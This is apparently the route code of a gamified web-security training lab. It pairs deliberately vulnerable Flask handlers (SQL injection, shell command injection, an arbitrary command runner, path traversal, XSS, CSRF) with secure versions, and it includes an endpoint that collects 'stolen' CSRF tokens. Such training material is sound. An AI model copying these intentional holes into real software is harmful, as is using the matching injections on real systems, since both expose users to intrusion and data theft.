@app.route("/attack_chain_1/stage1")
@login_required
def attack_chain_1_stage1():
    """Chain 1 Stage 1: SQL Injection"""
    sql_email = request.args.get("sql_email", "")
    sql_password = request.args.get("sql_password", "")
    sql_result = ""
    sql_secure_result = ""

    if sql_email or sql_password:
        # Vulnerable SQL
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        vuln_query = f"SELECT * FROM users WHERE email = '{sql_email}'"
        try:
            cursor.execute(vuln_query)
            user = cursor.fetchone()
            if user:
                sql_result = f"✅ SQL Injection Success! Logged in as: {user[1]}"
            else:
                sql_result = "❌ No user found"
        except Exception as e:
            sql_result = f"❌ SQL Error: {str(e)}"
        conn.close()

        # Secure SQL
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE email = ?", (sql_email,))
        user = cursor.fetchone()
        if user:
            sql_secure_result = f"✅ Found user: {user[1]}"
        else:
            sql_secure_result = "❌ Invalid credentials"
        conn.close()

    return render_template("chain1_stage1.html",
        sql_email=sql_email,
        sql_password=sql_password,
        sql_result=sql_result,
        sql_secure_result=sql_secure_result
    )


@app.route("/attack_chain_1/stage2")
@login_required
def attack_chain_1_stage2():
    """Chain 1 Stage 2: Command Injection"""
    cmd_pattern = request.args.get("cmd_pattern", "")
    cmd_result = ""
    cmd_secure_result = ""

    if cmd_pattern:
        if os.name == "nt":
            cmd = f'dir /s /b *{cmd_pattern}* 2>nul'
        else:
            cmd = f'find {BASE_DIR} -name "*{cmd_pattern}*"'
        try:
            result = subprocess.run(cmd, shell=True, cwd=BASE_DIR, timeout=5, capture_output=True)
            output = result.stdout.decode("utf-8", errors="ignore")
            errors = result.stderr.decode("utf-8", errors="ignore")
            cmd_result = output if output.strip() else (errors if errors.strip() else "No files found")
        except Exception as e:
            cmd_result = f"Error: {str(e)}"

        # Secure
        safe_pattern = "".join(c for c in cmd_pattern if c.isalnum() or c in "._-")
        files = []
        for root, dirs, filenames in os.walk(PUBLIC_DIR):
            for filename in filenames:
                if safe_pattern.lower() in filename.lower():
                    files.append(os.path.join(root, filename))
        cmd_secure_result = "\n".join(files) if files else "No files found"

    return render_template("chain1_stage2.html",
        cmd_pattern=cmd_pattern,
        cmd_result=cmd_result,
        cmd_secure_result=cmd_secure_result
    )


@app.route("/attack_chain_1/stage3")
@login_required
def attack_chain_1_stage3():
    """Chain 1 Stage 3: Path Traversal"""
    path_file = request.args.get("path_file", "")
    path_result = ""
    path_secure_result = ""

    if path_file:
        vuln_path = os.path.join(PUBLIC_DIR, path_file)
        try:
            if os.path.exists(vuln_path):
                with open(vuln_path, "r", encoding="utf-8", errors="ignore") as f:
                    path_result = f.read()
            else:
                path_result = "File not found"
        except Exception as e:
            path_result = f"Error: {str(e)}"

        # Secure
        safe_name = secure_filename(path_file)
        secure_path = os.path.join(PUBLIC_DIR, safe_name)
        abs_path = os.path.abspath(secure_path)
        if abs_path.startswith(os.path.abspath(PUBLIC_DIR) + os.sep):
            try:
                with open(abs_path, "r", encoding="utf-8", errors="ignore") as f:
                    path_secure_result = f.read()
            except:
                path_secure_result = "File not found in public directory"
        else:
            path_secure_result = "Access denied - path traversal blocked"

    return render_template("chain1_stage3.html",
        path_file=path_file,
        path_result=path_result,
        path_secure_result=path_secure_result
    )


# ==================== ATTACK CHAIN 2 STAGES ====================

@app.route("/attack_chain_2/stage1")
@login_required
def attack_chain_2_stage1():
    """Chain 2 Stage 1: XSS"""
    from markupsafe import escape
    name = request.args.get("name", "")
    name_unsafe = name  # For vulnerable demo
    name_safe = escape(name) if name else ""
    xss_triggered = "<script>" in name.lower()

    return render_template("chain2_stage1.html",
        name=name,
        name_unsafe=name_unsafe,
        name_safe=name_safe,
        xss_triggered=xss_triggered
    )


@app.route("/attack_chain_2/stage2")
@login_required
def attack_chain_2_stage2():
    """Chain 2 Stage 2: Session Hijacking"""
    payload = request.args.get("payload", "")
    payload_result = ""
    session_stolen = False
    stolen_cookie = request.args.get("cookie", "")

    if payload:
        if "document.cookie" in payload.lower() and ("image" in payload.lower() or "fetch" in payload.lower() or "src" in payload.lower()):
            payload_result = "✅ Cookie theft payload detected! Session could be stolen."
            session_stolen = True
        else:
            payload_result = "⚠️ Payload doesn't appear to exfiltrate cookies. Try harder!"

    return render_template("chain2_stage2.html",
        payload=payload,
        payload_result=payload_result,
        session_stolen=session_stolen,
        stolen_cookie=stolen_cookie
    )


@app.route("/attack_chain_2/stage3")
@login_required
def attack_chain_2_stage3():
    """Chain 2 Stage 3: CSRF"""
    csrf_success = False
    new_password = request.args.get("new_password", "")

    return render_template("chain2_stage3.html",
        csrf_success=csrf_success,
        new_password=new_password
    )


# ==================== ATTACK CHAIN 3 STAGES ====================

@app.route("/attack_chain_3/stage1")
@login_required
def attack_chain_3_stage1():
    """Chain 3 Stage 1: Command Injection (Ping)"""
    host = request.args.get("host", "")
    cmd_result = ""
    cmd_secure_result = ""

    if host:
        if os.name == "nt":
            cmd = f'ping -n 1 {host}'
        else:
            cmd = f'ping -c 1 {host}'
        try:
            output = subprocess.check_output(cmd, shell=True, cwd=BASE_DIR, timeout=10, stderr=subprocess.STDOUT)
            cmd_result = output.decode("utf-8", errors="ignore")
        except Exception as e:
            cmd_result = str(e)

        # Secure - validate IP/hostname only
        import re
        if re.match(r'^[\w\.\-]+$', host):
            try:
                output = subprocess.check_output(["ping", "-n" if os.name == "nt" else "-c", "1", host], timeout=10, stderr=subprocess.STDOUT)
                cmd_secure_result = output.decode("utf-8", errors="ignore")
            except Exception as e:
                cmd_secure_result = f"Error: {str(e)}"
        else:
            cmd_secure_result = "Invalid hostname - only alphanumeric, dots, and hyphens allowed"

    return render_template("chain3_stage1.html",
        host=host,
        cmd_result=cmd_result,
        cmd_secure_result=cmd_secure_result
    )


@app.route("/attack_chain_3/stage2")
@login_required
def attack_chain_3_stage2():
    """Chain 3 Stage 2: Reconnaissance"""
    cmd = request.args.get("cmd", "")
    cmd_output = ""
    found_secret = False
    discoveries = []

    if cmd:
        try:
            output = subprocess.check_output(cmd, shell=True, cwd=BASE_DIR, timeout=5, stderr=subprocess.STDOUT)
            cmd_output = output.decode("utf-8", errors="ignore")
            if "secret" in cmd_output.lower():
                found_secret = True
                discoveries.append("Found 'secret' directory!")
        except Exception as e:
            cmd_output = str(e)

    return render_template("chain3_stage2.html",
        cmd=cmd,
        cmd_output=cmd_output,
        found_secret=found_secret,
        discoveries=discoveries
    )


@app.route("/attack_chain_3/stage3")
@login_required
def attack_chain_3_stage3():
    """Chain 3 Stage 3: Path Traversal Exfiltration"""
    file_path = request.args.get("file", "")
    file_content = ""
    secure_result = ""
    flag_found = False

    if file_path:
        vuln_path = os.path.join(PUBLIC_DIR, file_path)
        try:
            if os.path.exists(vuln_path):
                with open(vuln_path, "r", encoding="utf-8", errors="ignore") as f:
                    file_content = f.read()
                if "flag" in file_content.lower() or "secret" in file_path.lower():
                    flag_found = True
            else:
                file_content = "File not found"
        except Exception as e:
            file_content = f"Error: {str(e)}"

        # Secure version
        safe_name = secure_filename(os.path.basename(file_path))
        secure_path = os.path.join(PUBLIC_DIR, safe_name)
        if os.path.exists(secure_path):
            try:
                with open(secure_path, "r", encoding="utf-8", errors="ignore") as f:
                    secure_result = f.read()
            except:
                secure_result = "Error reading file"
        else:
            secure_result = "File not found or access denied"

    return render_template("chain3_stage3.html",
        file_path=file_path,
        file_content=file_content,
        secure_result=secure_result,
        flag_found=flag_found
    )


@app.route("/steal_and_csrf", methods=["POST"])
def steal_and_csrf():
    """
    Receives stolen CSRF token and session from XSS, then performs CSRF attack
    """
    data = request.get_json()
    csrf_token = data.get("csrf_token", "")
    target_email = data.get("email", "")

    print("\n" + "=" * 60)
    print("🔗 ATTACK CHAIN: XSS → CSRF")
    print(f"Stolen CSRF Token: {csrf_token}")
    print(f"Victim Email: {target_email}")
    print("=" * 60 + "\n")

    return {"status": "success", "message": "Attack chain completed"}


# ==================== GAMIFICATION API ROUTES ====================

@app.route("/api/gamification/status")
@login_required
def gamification_status():
    """Get current gamification status."""
    init_gamification()
    return jsonify({
        "score": session.get("score", 0),
        "progress": session.get("progress", {}),
        "achievements": session.get("achievements", []),
        "chain1_progress": get_chain_progress(1),
        "chain2_progress": get_chain_progress(2),
        "chain3_progress": get_chain_progress(3),
    })


@app.route("/api/gamification/complete_stage", methods=["POST"])
@login_required
def api_complete_stage():
    """Mark a stage as complete via API."""
    data = request.get_json()
    chain_num = data.get("chain", 1)
    stage_num = data.get("stage", 1)
    hints_used = data.get("hints_used", 0)
    
    result = mark_stage_complete(chain_num, stage_num, hints_used)
    
    return jsonify({
        "success": True,
        "points_earned": result["new_score"],
        "new_achievements": result["new_achievements"],
        "total_score": session.get("score", 0),
        "progress": session.get("progress", {}),
    })


@app.route("/api/gamification/start_timer", methods=["POST"])
@login_required
def api_start_timer():
    """Start timer for a chain."""
    data = request.get_json()
    chain_num = data.get("chain", 1)
    start_chain_timer(chain_num)
    return jsonify({"success": True})


@app.route("/api/gamification/get_timer/<int:chain_num>")
@login_required
def api_get_timer(chain_num):
    """Get elapsed time for a chain."""
    return jsonify({"elapsed": get_chain_timer(chain_num)})


@app.route("/api/gamification/record_hint", methods=["POST"])
@login_required
def api_record_hint():
    """Record hint usage."""
    data = request.get_json()
    chain_num = data.get("chain", 1)
    stage_num = data.get("stage", 1)
    record_hint_usage(chain_num, stage_num)
    return jsonify({"success": True})


@app.route("/api/gamification/reset", methods=["POST"])
@login_required
def api_reset_progress():
    """Reset all gamification progress."""
    session["progress"] = {
        "chain1": {"stage1": False, "stage2": False, "stage3": False},
        "chain2": {"stage1": False, "stage2": False, "stage3": False},
        "chain3": {"stage1": False, "stage2": False, "stage3": False},
    }
    session["score"] = 0
    session["achievements"] = []
    session["hints_used"] = {}
    session["chain_timers"] = {}
    session.modified = True
    return jsonify({"success": True, "message": "Progress reset!"})


@app.route("/achievements")
@login_required
def achievements_page():
    """Display achievements page."""
    init_gamification()
    user_achievements = session.get("achievements", [])
    all_achievements = []
    
    for key, ach in ACHIEVEMENTS.items():
        all_achievements.append({
            "key": key,
            "name": ach["name"],
            "description": ach["description"],
            "icon": ach["icon"],
            "color": ach["color"],
            "unlocked": key in user_achievements
        })
    
    return render_template("achievements.html",
        achievements=all_achievements,
        score=session.get("score", 0),
        progress={
            "chain1": get_chain_progress(1),
            "chain2": get_chain_progress(2),
            "chain3": get_chain_progress(3),
        }
    )


@app.route("/defense_guide")
@login_required
def defense_guide():
    """Display interactive defense implementation guide."""
    return render_template("defense_guide_interactive.html")


# ==================== QUIZ SYSTEM ====================

@app.route("/quiz")
@login_required
def quiz():
    """Display the security quiz page."""
    import random
    
    # Get 5 random questions
    questions = random.sample(QUIZ_QUESTIONS, min(5, len(QUIZ_QUESTIONS)))
    
    # Store correct answers in session for validation
    session["quiz_answers"] = {q["id"]: q["correct"] for q in questions}
    session["quiz_questions"] = [q["id"] for q in questions]
    session.modified = True
    
    # Remove correct answer from questions sent to client
    safe_questions = []
    for q in questions:
        safe_q = {
            "id": q["id"],
            "category": q["category"],
            "question": q["question"],
            "code": q["code"],
            "options": q["options"]
        }
        safe_questions.append(safe_q)
    
    return render_template("quiz.html", questions=safe_questions)


@app.route("/api/quiz/submit", methods=["POST"])
@login_required
def submit_quiz():
    """Submit quiz answers and get results."""
    data = request.get_json()
    answers = data.get("answers", {})
    
    correct_answers = session.get("quiz_answers", {})
    question_ids = session.get("quiz_questions", [])
    
    if not correct_answers:
        return jsonify({"error": "No active quiz session"}), 400
    
    results = []
    score = 0
    
    for qid in question_ids:
        q = next((q for q in QUIZ_QUESTIONS if q["id"] == qid), None)
        if not q:
            continue
            
        user_answer = answers.get(str(qid))
        is_correct = user_answer == correct_answers.get(qid)
        
        if is_correct:
            score += 1
        
        results.append({
            "id": qid,
            "correct": is_correct,
            "correct_answer": correct_answers.get(qid),
            "user_answer": user_answer,
            "explanation": q["explanation"]
        })
    
    total = len(question_ids)
    percentage = int((score / total) * 100) if total > 0 else 0
    
    # Award achievement for perfect score
    new_achievements = []
    if percentage == 100 and "quiz_master" not in session.get("achievements", []):
        init_gamification()
        session["achievements"].append("quiz_master")
        new_achievements.append(ACHIEVEMENTS["quiz_master"])
        session.modified = True
    
    # Award bonus points for quiz
    bonus_points = score * 20  # 20 points per correct answer
    if bonus_points > 0:
        init_gamification()
        session["score"] = session.get("score", 0) + bonus_points
        session.modified = True
    
    # Clear quiz session
    session.pop("quiz_answers", None)
    session.pop("quiz_questions", None)
    
    return jsonify({
        "score": score,
        "total": total,
        "percentage": percentage,
        "bonus_points": bonus_points,
        "results": results,
        "new_achievements": new_achievements
    })


if __name__ == "__main__":
    # For demo purposes only; in production use a real WSGI server
    app.run(host="0.0.0.0", port=5000, debug=True)
